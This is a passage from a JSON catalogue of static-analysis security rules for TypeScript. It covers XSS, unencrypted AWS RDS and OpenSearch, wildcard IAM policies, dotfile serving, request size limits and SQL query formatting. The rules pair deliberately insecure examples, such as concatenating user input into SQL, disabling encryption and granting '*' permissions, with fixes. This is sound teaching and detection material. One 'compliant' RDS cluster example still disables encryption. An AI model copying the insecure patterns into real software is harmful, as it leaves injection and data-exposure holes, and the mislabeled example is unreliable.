},\n});\n</pre>\n<p>When using JSX, putting the content as a child node of the element is safe:</p>\n<pre>\n&lt;div&gt;{this.htmlContent}&lt;/div&gt;\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)\">Top 10 2017 Category A7 - Cross-Site Scripting\n  (XSS)</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/79\">CWE-79 - Improper Neutralization of Input During Web Page Generation ('Cross-site\n  Scripting')</a> </li>\n  <li> <a href=\"https://vuejs.org/v2/guide/security.html#Injecting-HTML\">Vue.js - Security - Injecting HTML</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "typescript:S6303": {
        "name": "Using unencrypted RDS DB resources is security-sensitive",
        "htmlDesc": "<p>Using unencrypted RDS DB resources exposes data to unauthorized access.<br> This includes database data, logs, automatic backups, read replicas,\nsnapshots, and cluster metadata.</p>\n<p>This situation can occur in a variety of scenarios, such as:</p>\n<ul>\n  <li> A malicious insider working at the cloud provider gains physical access to the storage device. </li>\n  <li> Unknown attackers penetrate the cloud provider’s logical infrastructure and systems. </li>\n</ul>\n<p>After a successful intrusion, the underlying applications are exposed to:</p>\n<ul>\n  <li> theft of intellectual property and/or personal data </li>\n  <li> extortion </li>\n  <li> denial of services and security bypasses via data corruption or deletion </li>\n</ul>\n<p>AWS-managed encryption at rest reduces this risk with a simple switch.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The database contains sensitive data that could cause harm when leaked. </li>\n  <li> There are compliance requirements for the service to store data encrypted. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It is recommended to enable encryption at rest on any RDS DB resource, regardless of the engine.<br> In any case, no further maintenance is\nrequired as encryption at rest is fully managed by AWS.</p>\n<h2>Sensitive Code Example</h2>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.CfnDBCluster.html\"><code>aws-cdk-lib.aws_rds.CfnDBCluster</code></a>:</p>\n<pre>\nimport { aws_rds as rds } from 'aws-cdk-lib';\n\nnew rds.CfnDBCluster(this, 'example', {\n  storageEncrypted: false, // Sensitive\n});\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.CfnDBInstance.html\"><code>aws-cdk-lib.aws_rds.CfnDBInstance</code></a>:</p>\n<pre>\nimport { aws_rds as rds } from 'aws-cdk-lib';\n\nnew rds.CfnDBInstance(this, 'example', {\n  storageEncrypted: false, // Sensitive\n});\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.DatabaseCluster.html\"><code>aws-cdk-lib.aws_rds.DatabaseCluster</code></a>:</p>\n<pre>\nimport { aws_rds as rds } from 'aws-cdk-lib';\nimport { aws_ec2 as ec2 } from 'aws-cdk-lib';\n\ndeclare const vpc: ec2.Vpc;\n\nconst cluster = new rds.DatabaseCluster(this, 'example', {\n  engine: rds.DatabaseClusterEngine.auroraMysql({ version: rds.AuroraMysqlEngineVersion.VER_2_08_1 }),\n  instanceProps: {\n    vpcSubnets: {\n      subnetType: ec2.SubnetType.PRIVATE_WITH_EGRESS,\n    },\n    vpc,\n  },\n  storageEncrypted: false, // Sensitive\n});\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.DatabaseClusterFromSnapshot.html\"><code>aws-cdk-lib.aws_rds.DatabaseClusterFromSnapshot</code></a>:</p>\n<pre>\nimport { aws_rds as rds } from 'aws-cdk-lib';\n\ndeclare const vpc: ec2.Vpc;\n\nnew rds.DatabaseClusterFromSnapshot(this, 'example', {\n  engine: rds.DatabaseClusterEngine.aurora({ version: rds.AuroraEngineVersion.VER_1_22_2 }),\n  instanceProps: {\n    vpc,\n  },\n  snapshotIdentifier: 'exampleSnapshot',\n  storageEncrypted: false, // Sensitive\n});\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.DatabaseInstance.html\"><code>aws-cdk-lib.aws_rds.DatabaseInstance</code></a>:</p>\n<pre>\nimport { aws_rds as rds } from 'aws-cdk-lib';\n\ndeclare const vpc: ec2.Vpc;\n\nnew rds.DatabaseInstance(this, 'example', {\n  engine: rds.DatabaseInstanceEngine.POSTGRES,\n  vpc,\n  storageEncrypted: false, // Sensitive\n});\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.DatabaseInstanceReadReplica.html\"><code>aws-cdk-lib.aws_rds.DatabaseInstanceReadReplica</code></a>:</p>\n<pre>\nimport { aws_rds as rds } from 'aws-cdk-lib';\n\ndeclare const sourceInstance: rds.DatabaseInstance;\n\nnew rds.DatabaseInstanceReadReplica(this, 'example', {\n  sourceDatabaseInstance: sourceInstance,\n  instanceType: ec2.InstanceType.of(ec2.InstanceClass.BURSTABLE2, ec2.InstanceSize.LARGE),\n  vpc,\n  storageEncrypted: false, // Sensitive\n});\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.CfnDBCluster.html\"><code>aws-cdk-lib.aws_rds.CfnDBCluster</code></a>:</p>\n<pre>\nimport { aws_rds as rds } from 'aws-cdk-lib';\n\nnew rds.CfnDBCluster(this, 'example', {\n  storageEncrypted: true,\n});\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.CfnDBInstance.html\"><code>aws-cdk-lib.aws_rds.CfnDBInstance</code></a>:</p>\n<pre>\nimport { aws_rds as rds } from 'aws-cdk-lib';\n\nnew rds.CfnDBInstance(this, 'example', {\n  storageEncrypted: true,\n});\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.DatabaseCluster.html\"><code>aws-cdk-lib.aws_rds.DatabaseCluster</code></a>:</p>\n<pre>\nimport { aws_rds as rds } from 'aws-cdk-lib';\n\ndeclare const vpc: ec2.Vpc;\n\nconst cluster = new rds.DatabaseCluster(this, 'example', {\n  engine: rds.DatabaseClusterEngine.auroraMysql({ version: rds.AuroraMysqlEngineVersion.VER_2_08_1 }),\n  instanceProps: {\n    vpcSubnets: {\n      subnetType: ec2.SubnetType.PRIVATE_WITH_EGRESS,\n    },\n    vpc,\n  },\n  storageEncrypted: false, // Sensitive\n});\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.DatabaseClusterFromSnapshot.html\"><code>aws-cdk-lib.aws_rds.DatabaseClusterFromSnapshot</code></a>:</p>\n<pre>\nimport { aws_rds as rds } from 'aws-cdk-lib';\n\ndeclare const vpc: ec2.Vpc;\n\nnew rds.DatabaseClusterFromSnapshot(this, 'example', {\n  engine: rds.DatabaseClusterEngine.aurora({ version: rds.AuroraEngineVersion.VER_1_22_2 }),\n  instanceProps: {\n    vpc,\n  },\n  snapshotIdentifier: 'exampleSnapshot',\n  storageEncrypted: true,\n});\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.DatabaseInstance.html\"><code>aws-cdk-lib.aws_rds.DatabaseInstance</code></a>:</p>\n<pre>\nimport { aws_rds as rds } from 'aws-cdk-lib';\n\ndeclare const vpc: ec2.Vpc;\n\nnew rds.DatabaseInstance(this, 'example', {\n  engine: rds.DatabaseInstanceEngine.POSTGRES,\n  vpc,\n  storageEncrypted: true,\n});\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.DatabaseInstanceReadReplica.html\"><code>aws-cdk-lib.aws_rds.DatabaseInstanceReadReplica</code></a>:</p>\n<pre>\nimport { aws_rds as rds } from 'aws-cdk-lib';\n\ndeclare const sourceInstance: rds.DatabaseInstance;\n\nnew rds.DatabaseInstanceReadReplica(this, 'example', {\n  sourceDatabaseInstance: sourceInstance,\n  instanceType: ec2.InstanceType.of(ec2.InstanceClass.BURSTABLE2, ec2.InstanceSize.LARGE),\n  vpc,\n  storageEncrypted: true,\n});\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/Overview.Encryption.html\">AWS Documentation</a> - Encrypting Amazon RDS\n  resources </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/311\">CWE-311 - Missing Encryption of Sensitive Data</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "typescript:S6304": {
        "name": "Policies granting access to all resources of an account are security-sensitive",
        "htmlDesc": "<p>A policy that allows identities to access all resources in an AWS account may violate <a\nhref=\"https://en.wikipedia.org/wiki/Principle_of_least_privilege\">the principle of least privilege</a>. Suppose an identity has permission to access\nall resources even though it only requires access to some non-sensitive ones. In this case, unauthorized access and disclosure of sensitive\ninformation will occur.</p>\n<h2>Ask Yourself Whether</h2>\n<p>The AWS account has more than one resource with different levels of sensitivity.</p>\n<p>A risk exists if you answered yes to this question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to apply the least privilege principle, i.e., by only granting access to necessary resources. A good practice to achieve this is\nto organize or <a\nhref=\"https://aws.amazon.com/blogs/security/simplify-granting-access-to-your-aws-resources-by-using-tags-on-aws-iam-users-and-roles/\">tag</a>\nresources depending on the sensitivity level of data they store or process. Therefore, managing a secure access control is less prone to errors.</p>\n<h2>Sensitive Code Example</h2>\n<p>The wildcard <code>\"*\"</code> is specified as the resource for this <code>PolicyStatement</code>. This grants the update permission for all\npolicies of the account:</p>\n<pre>\nimport { aws_iam as iam } from 'aws-cdk-lib'\n\nnew iam.PolicyDocument({\n    statements: [\n        new iam.PolicyStatement({\n            effect: iam.Effect.ALLOW,\n            actions: [\"iam:CreatePolicyVersion\"],\n            resources: [\"*\"] // Sensitive\n        })\n    ]\n})\n</pre>\n<h2>Compliant Solution</h2>\n<p>Restrict the update permission to the appropriate subset of policies:</p>\n<pre>\nimport { aws_iam as iam } from 'aws-cdk-lib'\n\nnew iam.PolicyDocument({\n    statements: [\n        new iam.PolicyStatement({\n            effect: iam.Effect.ALLOW,\n            actions: [\"iam:CreatePolicyVersion\"],\n            resources: [\"arn:aws:iam:::policy/team1/*\"]\n        })\n    ]\n})\n</pre>\n<h2>Exceptions</h2>\n<ul>\n  <li> Should not be raised on key policies (when AWS KMS actions are used.) </li>\n  <li> Should not be raised on policies not using any resources (if and only if all actions in the policy never require resources.) </li>\n</ul>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege\">AWS Documentation</a> - Grant least\n  privilege </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/732\">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/284\">CWE-284 - Improper Access Control</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "typescript:S5691": {
        "name": "Statically serving hidden files is security-sensitive",
        "htmlDesc": "<p>Hidden files are created automatically by many tools to save user-preferences, well-known examples are <code>.profile</code>, <code>.bashrc</code>,\n<code>.bash_history</code> or .<code>git</code>. To simplify the view these files are not displayed by default using operating system commands like\n<code>ls</code>.</p>\n<p>Outside of the user environment, hidden files are sensitive because they are used to store privacy-related information or even hard-coded\nsecrets.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Hidden files may have been inadvertently uploaded to the static server’s public directory and it accepts requests to hidden files. </li>\n  <li> There is no business use cases linked to serve files in <code>.name</code> format but the server is not configured to reject requests to this\n  type of files. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Disable the serving of hidden files. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p><a href=\"https://www.npmjs.com/package/serve-static\">Express.js serve-static</a> middleware:</p>\n<pre>\nlet serveStatic = require(\"serve-static\");\nlet app = express();\nlet serveStaticMiddleware = serveStatic('public', { 'index': false, 'dotfiles': 'allow'});   // Sensitive\napp.use(serveStaticMiddleware);\n</pre>\n<h2>Compliant Solution</h2>\n<p><a href=\"https://www.npmjs.com/package/serve-static\">Express.js serve-static</a> middleware:</p>\n<pre>\nlet serveStatic = require(\"serve-static\");\nlet app = express();\nlet serveStaticMiddleware = serveStatic('public', { 'index': false, 'dotfiles': 'ignore'});   // Compliant: ignore or deny are recommended values\nlet serveStaticDefault = serveStatic('public', { 'index': false});   // Compliant: by default, \"dotfiles\" (file or directory that begins with a dot) are not served (with the exception that files within a directory that begins with a dot are not ignored), see serve-static module documentation\napp.use(serveStaticMiddleware);\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> <a href=\"https://github.com/mtojek/go-url-fuzzer\">github.com/mtojek/go-url-fuzzer</a> - Discover hidden files and directories on a web server.\n  </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/538\">CWE-538 - File and Directory Information Exposure</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "typescript:S6302": {
        "name": "Policies granting all privileges are security-sensitive",
        "htmlDesc": "<p>A policy that grants all permissions may indicate an improper access control, which violates <a\nhref=\"https://en.wikipedia.org/wiki/Principle_of_least_privilege\">the principle of least privilege</a>. Suppose an identity is granted full\npermissions to a resource even though it only requires read permission to work as expected. In this case, an unintentional overwriting of resources\nmay occur and therefore result in loss of information.</p>\n<h2>Ask Yourself Whether</h2>\n<p>Identities obtaining all the permissions:</p>\n<ul>\n  <li> only require a subset of these permissions to perform the intended function. </li>\n  <li> have monitored activity showing that only a subset of these permissions is actually used. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to apply the least privilege principle, i.e. by only granting the necessary permissions to identities. A good practice is to start\nwith the very minimum set of permissions and to refine the policy over time. In order to fix overly permissive policies already deployed in\nproduction, a strategy could be to review the monitored activity in order to reduce the set of permissions to those most used.</p>\n<h2>Sensitive Code Example</h2>\n<p>A customer-managed policy that grants all permissions by using the wildcard (*) in the <code>Action</code> property:</p>\n<pre>\nimport { aws_iam as iam } from 'aws-cdk-lib'\n\nnew iam.PolicyStatement({\n    effect: iam.Effect.ALLOW,\n    actions: [\"*\"], // Sensitive\n    resources: [\"arn:aws:iam:::user/*\"],\n})\n</pre>\n<h2>Compliant Solution</h2>\n<p>A customer-managed policy that grants only the required permissions:</p>\n<pre>\nimport { aws_iam as iam } from 'aws-cdk-lib'\n\nnew iam.PolicyStatement({\n    effect: iam.Effect.ALLOW,\n    actions: [\"iam:GetAccountSummary\"],\n    resources: [\"arn:aws:iam:::user/*\"],\n})\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege\">AWS Documentation</a> - Grant least\n  privilege </li>\n  <li> <a href=\"https://cloud.google.com/iam/docs/understanding-roles\">Google Cloud Documentation</a> - Understanding roles </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/732\">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/284\">CWE-284 - Improper Access Control</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "typescript:S6308": {
        "name": "Using unencrypted Elasticsearch domains is security-sensitive",
        "htmlDesc": "<p>Amazon OpenSearch Service is a managed service to host OpenSearch instances. It replaces Elasticsearch Service, which has been deprecated.</p>\n<p>To harden domain (cluster) data in case of unauthorized access, OpenSearch provides data-at-rest encryption if the engine is OpenSearch (any\nversion), or Elasticsearch with a version of 5.1 or above. Enabling encryption at rest will help protect:</p>\n<ul>\n  <li> indices </li>\n  <li> logs </li>\n  <li> swap files </li>\n  <li> data in the application directory </li>\n  <li> automated snapshots </li>\n</ul>\n<p>Thus, adversaries cannot access the data if they gain physical access to the storage medium.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The database contains sensitive data that could cause harm when leaked. </li>\n  <li> There are compliance requirements for the service to store data encrypted. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It is recommended to encrypt OpenSearch domains that contain sensitive information.</p>\n<p>OpenSearch handles encryption and decryption transparently, so no further modifications to the application are necessary.</p>\n<h2>Sensitive Code Example</h2>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_opensearchservice.Domain.html\">aws-cdk-lib.aws_opensearchservice.Domain</a>:</p>\n<pre>\nimport { aws_opensearchservice as opensearchservice } from 'aws-cdk-lib';\n\nconst exampleDomain = new opensearchservice.Domain(this, 'ExampleDomain', {\n  version: EngineVersion.OPENSEARCH_1_3,\n}); // Sensitive, encryption must be explicitly enabled\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_opensearchservice.CfnDomain.html\">aws-cdk-lib.aws_opensearchservice.CfnDomain</a>:</p>\n<pre>\nimport { aws_opensearchservice as opensearchservice } from 'aws-cdk-lib';\n\nconst exampleCfnDomain = new opensearchservice.CfnDomain(this, 'ExampleCfnDomain', {\n  engineVersion: 'OpenSearch_1.3',\n}); // Sensitive, encryption must be explicitly enabled\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_opensearchservice.Domain.html\">aws-cdk-lib.aws_opensearchservice.Domain</a>:</p>\n<pre>\nimport { aws_opensearchservice as opensearchservice } from 'aws-cdk-lib';\n\nconst exampleDomain = new opensearchservice.Domain(this, 'ExampleDomain', {\n  version: EngineVersion.OPENSEARCH_1_3,\n  encryptionAtRest: {\n    enabled: true,\n  },\n});\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_opensearchservice.CfnDomain.html\">aws-cdk-lib.aws_opensearchservice.CfnDomain</a>:</p>\n<pre>\nimport { aws_opensearchservice as opensearchservice } from 'aws-cdk-lib';\n\nconst exampleCfnDomain = new opensearchservice.CfnDomain(this, 'ExampleCfnDomain', {\n  engineVersion: 'OpenSearch_1.3',\n  encryptionAtRestOptions: {\n    enabled: true,\n  },\n});\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/opensearch-service/latest/developerguide/encryption-at-rest.html\">AWS Documentation</a> - Encryption of\n  data at rest for Amazon OpenSearch Service </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/311\">CWE-311 - Missing Encryption of Sensitive Data</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "typescript:S5693": {
        "name": "Allowing requests with excessive content length is security-sensitive",
        "htmlDesc": "<p>Rejecting requests with significant content length is a good practice to control the network traffic intensity and thus resource consumption in\norder to prevent DoS attacks.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> size limits are not defined for the different resources of the web application. </li>\n  <li> the web application is not protected by <a href=\"https://en.wikipedia.org/wiki/Rate_limiting\">rate limiting</a> features. </li>\n  <li> the web application infrastructure has limited resources. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> For most of the features of an application, it is recommended to limit the size of requests to:\n    <ul>\n      <li> lower or equal to 8mb for file uploads. </li>\n      <li> lower or equal to 2mb for other requests. </li>\n    </ul>  </li>\n</ul>\n<p>It is recommended to customize the rule with the limit values that correspond to the web application.</p>\n<h2>Sensitive Code Example</h2>\n<p><a href=\"https://www.npmjs.com/package/formidable\">formidable</a> file upload module:</p>\n<pre>\nconst form = new Formidable();\nform.maxFileSize = 10000000; // Sensitive: 10MB is more than the recommended limit of 8MB\n\nconst formDefault = new Formidable(); // Sensitive, the default value is 200MB\n</pre>\n<p><a href=\"https://www.npmjs.com/package/multer\">multer</a> (Express.js middleware) file upload module:</p>\n<pre>\nlet diskUpload = multer({\n  storage: diskStorage,\n  limits: {\n    fileSize: 10000000; // Sensitive: 10MB is more than the recommended limit of 8MB\n  }\n});\n\nlet diskUploadUnlimited = multer({ // Sensitive: the default value is no limit\n  storage: diskStorage,\n});\n</pre>\n<p><a href=\"https://www.npmjs.com/package/body-parser\">body-parser</a> module:</p>\n<pre>\n// 4MB is more than the recommended limit of 2MB for non-file-upload requests\nlet jsonParser = bodyParser.json({ limit: \"4mb\" }); // Sensitive\nlet urlencodedParser = bodyParser.urlencoded({ extended: false, limit: \"4mb\" }); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<p><a href=\"https://www.npmjs.com/package/formidable\">formidable</a> file upload module:</p>\n<pre>\nconst form = new Formidable();\nform.maxFileSize = 8000000; // Compliant: 8MB\n</pre>\n<p><a href=\"https://www.npmjs.com/package/multer\">multer</a> (Express.js middleware) file upload module:</p>\n<pre>\nlet diskUpload = multer({\n  storage: diskStorage,\n  limits: {\n     fileSize: 8000000 // Compliant: 8MB\n  }\n});\n</pre>\n<p><a href=\"https://www.npmjs.com/package/body-parser\">body-parser</a> module:</p>\n<pre>\nlet jsonParser = bodyParser.json(); // Compliant, when the limit is not defined, the default value is set to 100kb\nlet urlencodedParser = bodyParser.urlencoded({ extended: false, limit: \"2mb\" }); // Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html\">Owasp Cheat Sheet</a> - Owasp Denial of Service\n  Cheat Sheet </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/770\">CWE-770 - Allocation of Resources Without Limits or Throttling</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/400\">CWE-400 - Uncontrolled Resource Consumption</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "typescript:S2077": {
        "name": "Formatting SQL queries is security-sensitive",
        "htmlDesc": "<p>Formatted SQL queries can be difficult to maintain, debug and can increase the risk of SQL injection when concatenating untrusted values into the\nquery. However, this rule doesn’t detect SQL injections (unlike rule <a href='/coding_rules#rule_key=javascript%3AS3649'>S3649</a>), the goal is only to highlight complex/formatted\nqueries.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Some parts of the query come from untrusted values (like user inputs). </li>\n  <li> The query is repeated/duplicated in other parts of the code. </li>\n  <li> The application must support different types of relational databases. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Use <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html\">parameterized queries, prepared\n  statements, or stored procedures</a> and bind variables to SQL query parameters. </li>\n  <li> Consider using ORM frameworks if there is a need to have an abstract layer to access data. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\n// === MySQL ===\nconst mysql = require('mysql');\nconst mycon = mysql.createConnection({ host: host, user: user, password: pass, database: db });\nmycon.connect(function(err) {\n  mycon.query('SELECT * FROM users WHERE id = ' + userinput, (err, res) =&gt; {}); // Sensitive\n});\n\n// === PostgreSQL ===\nconst pg = require('pg');\nconst pgcon = new pg.Client({ host: host, user: user, password: pass, database: db });\npgcon.connect();\npgcon.query('SELECT * FROM users WHERE id = ' + userinput, (err, res) =&gt; {}); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n// === MySQL ===\nconst mysql = require('mysql');\nconst mycon = mysql.createConnection({ host: host, user: user, password: pass, database: db });\nmycon.connect(function(err) {\n  mycon.query('SELECT name FROM users WHERE id = ?', [userinput], (err, res) =&gt; {});\n});\n\n// === PostgreSQL ===\nconst pg = require('pg');\nconst pgcon = new pg.Client({ host: host, user: user, password: pass, database: db });\npgcon.connect();\npgcon.query('SELECT name FROM users WHERE id = $1', [userinput], (err, res) =&gt; {});\n</pre>\n<h2>Exceptions</h2>\n<p>This rule’s current implementation does not follow variables. It will only detect SQL queries which are formatted directly in the function\ncall.</p>\n<pre>\nconst sql = 'SELECT * FROM users WHERE id = ' + userinput;\nmycon.query(sql, (err, res) =&gt; {}); // Sensitive but no issue is raised.\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/89\">CWE-89 - Improper Neutralization of Special Elements used in an SQL Command</a> </li>\n  <li> Derived from FindSecBugs rules <a href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JPA\">Potential SQL/JPQL Injection\n  (JPA)</a>, <a href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JDO\">Potential SQL/JDOQL Injection (JDO)</a>, <a\n  href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_HIBERNATE\">Potential SQL/HQL Injection (Hibernate)</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "typescript:S6317": {
        "name": "AWS IAM policies should limit the scope of permissions given",
        "htmlDesc": "<p>Within IAM, identity-based policies grant permissions to users, groups, or roles, and enable specific actions to be performed on designated\nresources. When an identity policy inadvertently grants more privileges than intended, certain users or roles might be able to perform more actions\nthan expected. This can lead to potential security risks, as it enables malicious users to escalate their privileges from a lower level to a higher\nlevel of access.</p>\n<h2>Why is this an issue?</h2>\n<p>AWS Identity and Access Management (IAM) is the service that defines access to AWS resources. One of the core components of IAM is the policy\nwhich, when attached to an identity or a resource, defines its permissions. Policies granting permission to an identity (a user, a group or a role)\nare called identity-based policies. They add the ability to an identity to perform a predefined set of actions on a list of resources.</p>\n<p>For such policies, it is easy to define very broad permissions (by using wildcard <code>\"*\"</code> permissions for example.) This is especially\ntrue if it is not yet clear which permissions will be required for a specific workload or use case. However, it is important to limit the amount of\npermissions that are granted and the amount of resources to which these permissions are granted. Doing so ensures that there are no users or roles\nthat have more permissions than they need.</p>\n<p>If this is not done, it can potentially carry security risks in the case that an attacker gets access to one of these identities.</p>\n<h3>What is the potential impact?</h3>\n<p>AWS IAM policies that contain overly broad permissions can lead to privilege escalation by granting users more access than necessary. They may be\nable to perform actions beyond their intended scope.</p>\n<h4>Privilege escalation</h4>\n<p>When IAM policies are too permissive, they grant users more privileges than necessary, allowing them to perform actions that they should not be\nable to. This can be exploited by attackers to gain unauthorized access to sensitive resources and perform malicious activities.</p>\n<p>For example, if an IAM policy grants a user unrestricted access to all S3 buckets in an AWS account, the user can potentially read, write, and\ndelete any object within those buckets. If an attacker gains access to this user’s credentials, they can exploit this overly permissive policy to\nexfiltrate sensitive data, modify or delete critical files, or even launch further attacks within the AWS environment. This can have severe\nconsequences, such as data breaches, service disruptions, or unauthorized access to other resources within the AWS account.</p>\n<h2>How to fix it in AWS CDK</h2>\n<h3>Code examples</h3>\n<p>In this example, the IAM policy allows an attacker to update the code of any Lambda function. An attacker can achieve privilege escalation by\naltering the code of a Lambda that executes with high privileges.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nimport { aws_iam as iam } from 'aws-cdk-lib'\n\nnew iam.PolicyDocument({\n    statements: [new iam.PolicyStatement({\n        effect: iam.Effect.ALLOW,\n        actions: [\"lambda:UpdateFunctionCode\"],\n        resources: [\"*\"], // Noncompliant\n    })],\n});\n</pre>\n<h4>Compliant solution</h4>\n<p>The policy is narrowed such that only updates to the code of certain Lambda functions (without high privileges) are allowed.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport { aws_iam as iam } from 'aws-cdk-lib'\n\nnew iam.PolicyDocument({\n    statements: [new iam.PolicyStatement({\n        effect: iam.Effect.ALLOW,\n        actions: [\"lambda:UpdateFunctionCode\"],\n        resources: [\"arn:aws:lambda:us-east-2:123456789012:function:my-function:1\"],\n    })],\n});\n</pre>\n<h3>How does this work?</h3>\n<h4>Principle of least privilege</h4>\n<p>When creating IAM policies, it is important to adhere to the principle of least privilege. This means that any user or role should only be granted\nenough permissions to perform the tasks that they are supposed to, and <em>nothing else</em>.</p>\n<p>To successfully implement this, it is easier to start from nothing and gradually build up all the needed permissions. When starting from a policy\nwith overly broad permissions which is made stricter at a later time, it can be harder to ensure that 